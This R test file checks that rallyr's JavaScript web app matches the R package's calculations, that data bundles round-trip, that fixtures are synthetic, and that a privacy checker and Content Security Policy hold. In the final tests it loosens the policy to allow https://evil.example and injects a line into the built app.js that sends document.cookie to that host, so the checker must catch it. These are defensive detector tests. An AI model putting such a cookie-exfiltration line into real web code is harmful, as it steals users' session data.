# The website's app is plain JavaScript (inst/app_js/) that repeats the R
# package's calculations. These tests run it with Node and check that it gives
# the R package's numbers, that bundles pass between the two, and that the
# built site holds the app and its sample data and passes the privacy check.
#
# Node is part of the project's Nix shell (default.R). Without it the tests are
# skipped with a message, except where a run must have it (CI, or
# RALLYR_REQUIRE_NODE=true): there a missing Node is an error, never a skip.

js_root <- function() system.file("app_js", package = "rallyr")

node_or_skip <- function() {
  node <- Sys.which("node")
  if (!nzchar(node)) {
    if (nzchar(Sys.getenv("CI")) || identical(Sys.getenv("RALLYR_REQUIRE_NODE"), "true")) {
      stop("node is not on PATH, but this run must have it (CI or RALLYR_REQUIRE_NODE): the JavaScript app was NOT tested.", call. = FALSE)
    }
    skip("node is not on PATH: the JavaScript tests did not run. Install Node 20 or newer (it is in the project's Nix shell).")
  }
  unname(node)
}

js_env <- function() {
  c(
    paste0("RALLYR_JS_DIR=", js_root()),
    paste0("RALLYR_FIXTURE_DIR=", normalizePath(test_path("fixtures", "js_parity"))),
    paste0("RALLYR_EXTDATA_DIR=", system.file("extdata", package = "rallyr"))
  )
}

# Run node; returns the output lines with the exit status as attribute "status".
run_node <- function(node, args) {
  out <- suppressWarnings(system2(node, shQuote(args), env = js_env(), stdout = TRUE, stderr = TRUE))
  status <- attr(out, "status")
  structure(out, status = if (is.null(status)) 0L else status)
}

tools_file <- function(name) test_path("..", "..", "tools", name)

test_that("the app's folder is part of the package", {
  expect_true(nzchar(js_root()))
  for (f in c("index.html", "app.css", file.path("js", c("app.js", "bundle.js", "charts.js", "sv.js", "dq.js", "metrics.js", "segment.js", "plotdata.js", "util.js")))) {
    expect_true(file.exists(file.path(js_root(), f)), info = f)
  }
})

test_that("every parity fixture holds only synthetic content", {
  dir <- test_path("fixtures", "js_parity")
  files <- list.files(dir, pattern = "\\.json\\.gz$", full.names = TRUE)
  expect_gte(length(files), 8L)
  invented <- c("Sample Player", "Sample Opponent")
  for (f in files) {
    txt <- paste(readLines(gzfile(f), warn = FALSE), collapse = "\n")
    # no email address, no address of a real site (the vendor's API base is public and in the package)
    expect_false(grepl("[A-Za-z0-9._-]+@[A-Za-z0-9-]+\\.[A-Za-z]{2,}", txt), info = basename(f))
    urls <- unique(regmatches(txt, gregexpr("https?://[A-Za-z0-9._-]+", txt))[[1]])
    expect_true(all(urls %in% c("https://api.swing.tennis", "https://swing.vision", "https://x.example", "https://s.v")), info = paste(basename(f), paste(urls, collapse = " ")))
    # the names of players that appear are the invented ones
    names_in <- unique(unlist(regmatches(txt, gregexpr('"(guest|host)_name":"[^"]*"', txt))))
    expect_true(all(sub('^"(guest|host)_name":"([^"]*)"$', "\\2", names_in) %in% invented), info = basename(f))
    # dates are the invented ones (2030 and 2031); no real session date
    years <- unique(unlist(regmatches(txt, gregexpr("\"(started_at|ended_at|fetched_at)\":\"[0-9]{4}", txt))))
    expect_true(all(sub("^.*:\"", "", years) %in% c("2029", "2030", "2031")), info = basename(f))
    # every share token of a session is a synthetic one (small_cases holds made-up
    # link strings on purpose, as input to the token function)
    if (basename(f) != "small_cases.json.gz") {
      tokens <- unique(unlist(regmatches(txt, gregexpr('"token":"[^"]*"', txt))))
      expect_true(all(startsWith(sub('^"token":"', "", tokens), "synthetic-")), info = basename(f))
    }
  }
  # the bundles, read as bundles: court names say synthetic
  for (f in file.path(dir, c("stress_bundle.json.gz", "edge_bundle.json.gz"))) {
    b <- bundle_read(f)
    courts <- unique(vapply(b$sessions, function(s) s$match$data$court$name, character(1)))
    expect_true(all(grepl("synthetic", courts)), info = basename(f))
    expect_true(all(bundle_players(b) %in% invented), info = basename(f))
  }
})

test_that("the JavaScript app gives the R package's numbers (node --test: parity, small cases, charts, and the comparison itself)", {
  node <- node_or_skip()
  files <- list.files(test_path("..", "js"), pattern = "\\.test\\.mjs$", full.names = TRUE)
  expect_gt(length(files), 3L)
  out <- run_node(node, c("--test", files))
  summary_lines <- grep("^. (tests|pass|fail|skipped) ", out, value = TRUE)
  expect_identical(attr(out, "status"), 0L, info = paste(c(tail(out, 40), summary_lines), collapse = "\n"))
  passed <- as.integer(sub("^. pass ", "", grep("^. pass ", out, value = TRUE)))
  expect_gt(passed, 30L)
  expect_true(any(grepl("^. fail 0$", out)), info = paste(summary_lines, collapse = "\n"))
  expect_true(any(grepl("^. skipped 0$", out)), info = "no JavaScript test may be skipped")
})

test_that("a bundle written by R reads in the app, and a bundle written by the app reads in R", {
  node <- node_or_skip()
  script <- normalizePath(test_path("js-roundtrip.mjs"))
  me <- "Sample Player"
  b <- sample_bundle()
  dir <- withr::local_tempdir()
  from_r <- file.path(dir, "from_r.json.gz")
  bundle_write(b, from_r)

  # R -> app: the app reads the file and works out the same sizes and values
  read_out <- file.path(dir, "read.json")
  res <- run_node(node, c(script, "read", from_r, read_out, me))
  expect_identical(attr(res, "status"), 0L, info = paste(res, collapse = "\n"))
  got <- jsonlite::fromJSON(read_out)
  tables <- bundle_to_tables(b, me)
  derived <- bundle_derived(tables)
  expect_equal(got$n_sessions, length(b$sessions))
  expect_equal(got$match_ids, vapply(b$sessions, function(s) s$match_id, numeric(1)))
  expect_equal(got$players, bundle_players(b))
  expect_equal(got$n_matches, nrow(tables$matches))
  expect_equal(got$n_shot_detail, nrow(tables$shot_detail))
  expect_equal(got$n_rallies, nrow(tables$rallies))
  expect_equal(got$n_corrected, nrow(derived$corrected_rallies))
  expect_equal(got$accuracy, derived$sessions$shots_in_pct)

  # app -> R: a bundle the app read and wrote again is the same bundle
  rewritten <- file.path(dir, "rewritten.json.gz")
  res <- run_node(node, c(script, "rewrite", from_r, rewritten))
  expect_identical(attr(res, "status"), 0L, info = paste(res, collapse = "\n"))
  expect_equal(bundle_read(rewritten)$sessions, b$sessions)

  # app -> R: a session the app added is the session R adds
  extra <- list.files(system.file("extdata", "synthetic_sample_session", package = "rallyr"), full.names = TRUE)
  expect_length(extra, 3L)
  kind <- vapply(extra, bundle_payload_kind, character(1))
  extra <- extra[match(c("match", "stats", "shots"), kind)]
  added <- file.path(dir, "added.json.gz")
  report_file <- file.path(dir, "report.json")
  res <- run_node(node, c(script, "add", from_r, added, report_file, extra, "synthetic-0007", "2031-02-01T09:00:00Z"))
  expect_identical(attr(res, "status"), 0L, info = paste(res, collapse = "\n"))
  expected <- bundle_add_raw(b, extra[1], extra[2], extra[3], token = "synthetic-0007", fetched_at = "2031-02-01T09:00:00Z")
  expect_equal(bundle_read(added)$sessions, expected$sessions)
  report <- jsonlite::fromJSON(report_file)
  expect_equal(report$action, attr(expected, "merge_report")$action)
  expect_equal(report$match_id, attr(expected, "merge_report")$match_id)
})

test_that("the round trip can fail: a bundle changed on the way is noticed", {
  node <- node_or_skip()
  script <- normalizePath(test_path("js-roundtrip.mjs"))
  b <- sample_bundle()
  dir <- withr::local_tempdir()
  from_r <- file.path(dir, "from_r.json.gz")
  bundle_write(b, from_r)
  rewritten <- file.path(dir, "rewritten.json.gz")
  run_node(node, c(script, "rewrite", from_r, rewritten))
  back <- bundle_read(rewritten)
  expect_equal(back$sessions, b$sessions)
  # change one value of the copy: the comparison must report it
  back$sessions[[3]]$shots$data[[5]]$hit_frame <- back$sessions[[3]]$shots$data[[5]]$hit_frame + 1
  expect_false(isTRUE(all.equal(back$sessions, b$sessions)))
  # and a file that is not a bundle makes the app's reader refuse it, with a message
  bad <- file.path(dir, "bad.json")
  writeLines('{"schema_version": 1, "sessions": [{"match_id": 1}]}', bad)
  res <- run_node(node, c(script, "rewrite", bad, file.path(dir, "never.json.gz")))
  expect_false(identical(attr(res, "status"), 0L))
  expect_true(any(grepl("Not a valid rallyr bundle", res)), info = paste(res, collapse = "\n"))
})

test_that("the shipped page's policy allows this site only, and the privacy checker holds it to that", {
  html <- paste(readLines(file.path(js_root(), "index.html"), warn = FALSE), collapse = "\n")
  csp <- regmatches(html, regexec("http-equiv=\"Content-Security-Policy\" content=\"([^\"]+)\"", html))[[1]][2]
  expect_true(!is.na(csp) && nzchar(csp))
  directives <- trimws(strsplit(csp, ";", fixed = TRUE)[[1]])
  expect_true("default-src 'self'" %in% directives)
  expect_true("connect-src 'self' blob: data:" %in% directives)
  expect_true("script-src 'self'" %in% directives)
  expect_true("worker-src 'none'" %in% directives)
  expect_true("object-src 'none'" %in% directives)
  # tighter than the Shiny app's: no inline or eval-ed script or style, no WebAssembly
  expect_false(grepl("unsafe-|wasm|https?:|\\*", csp))

  skip_if_not(file.exists(tools_file("check_site_privacy.R")), "tools/ is not part of the installed package")
  env <- new.env(parent = globalenv())
  sys.source(tools_file("check_site_privacy.R"), envir = env)
  page <- function(content) {
    dir <- withr::local_tempdir(.local_envir = parent.frame())
    dir.create(file.path(dir, "app"))
    writeLines(sprintf('<html><head><meta http-equiv="Content-Security-Policy" content="%s"></head></html>', content),
               file.path(dir, "app", "index.html"))
    dir
  }
  expect_equal(nrow(env$check_site_privacy(page(csp), csp_dir = "app")), 0L)
  for (swap in list(
    c("connect-src 'self' blob: data:", "connect-src 'self' https://evil.example"),
    c("script-src 'self'", "script-src 'self' https://evil.example"),
    c("img-src 'self' data: blob:", "img-src https:")
  )) {
    loose <- sub(swap[1], swap[2], csp, fixed = TRUE)
    expect_false(identical(loose, csp), info = swap[1])
    expect_gt(nrow(env$check_site_privacy(page(loose), csp_dir = "app")), 0L)
  }
})

test_that("the build puts the app and its sample data in the site, and the static privacy check passes on it", {
  skip_if_not(file.exists(tools_file("build_app.R")), "tools/ is not part of the installed package")
  env <- new.env(parent = globalenv())
  sys.source(tools_file("build_app.R"), envir = env)
  sys.source(tools_file("app_sources.R"), envir = env)
  sys.source(tools_file("check_site_privacy.R"), envir = env)
  root <- normalizePath(test_path("..", ".."))
  site <- withr::local_tempdir()
  dest <- env$build_app_js(root, site)
  expect_identical(normalizePath(dest), normalizePath(file.path(site, "app")))
  built <- list.files(dest, recursive = TRUE)
  expect_true(all(c("index.html", "app.css", "js/app.js", "js/bundle.js", "js/sample_data.js") %in% built))
  expect_false(any(grepl("package\\.json|node_modules|\\.test\\.", built)))
  # the sample data are derived from inst/extdata, not typed
  node <- Sys.which("node")
  if (nzchar(node) || nzchar(Sys.getenv("CI"))) {
    node <- node_or_skip()
    res <- run_node(node, c(normalizePath(test_path("js-sampledata.mjs")), dest, file.path(root, "inst", "extdata")))
    expect_true(any(grepl("SAMPLE DATA OK", res, fixed = TRUE)), info = paste(res, collapse = "\n"))
  }

  api <- eval(parse(text = env$app_collect_definitions(file.path(root, "R"))$sv_api_base$text))
  nav <- c(env$origin_of(api()), "https://github.com")
  green <- env$check_site_privacy(site, allowed_navigation = nav, csp_dir = "app")
  expect_equal(nrow(green), 0L)
  expect_gt(attr(green, "n_files"), 8L)

  # RED: put a request to another site into the app on purpose
  app_js <- file.path(dest, "js", "app.js")
  code <- readLines(app_js)
  writeLines(c(code, 'fetch("https://evil.example/collect?d=" + document.cookie);'), app_js)
  red <- env$check_site_privacy(site, allowed_navigation = nav, csp_dir = "app")
  expect_true(all(c("network-call", "unlisted-origin") %in% red$rule))
  expect_true(all(red$file == "app/js/app.js"))
  # GREEN again
  writeLines(code, app_js)
  expect_equal(nrow(env$check_site_privacy(site, allowed_navigation = nav, csp_dir = "app")), 0L)

  # the build refuses missing sample files, with a message
  expect_error(env$app_js_sample_data(withr::local_tempdir()), "Sample files missing")
})
